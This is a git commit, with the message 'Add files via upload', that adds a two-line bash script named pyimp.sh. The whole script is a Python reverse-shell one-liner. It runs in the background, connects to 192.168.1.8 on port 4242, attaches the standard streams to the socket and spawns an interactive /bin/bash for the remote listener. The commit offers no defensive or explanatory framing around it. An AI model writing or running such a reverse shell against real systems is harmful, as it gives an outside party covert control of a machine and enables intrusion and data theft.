325d4bc8100a3ca68d704b98226f579c6c406852
TheBH <76681493+bhupenderbhardwaj83@users.noreply.github.com>
2021-09-21 22:37:50 +0530

    Add files via upload

---
+++ pyimp.sh
@@ -0,0 +1,2 @@
+#! /bin/bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.8",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
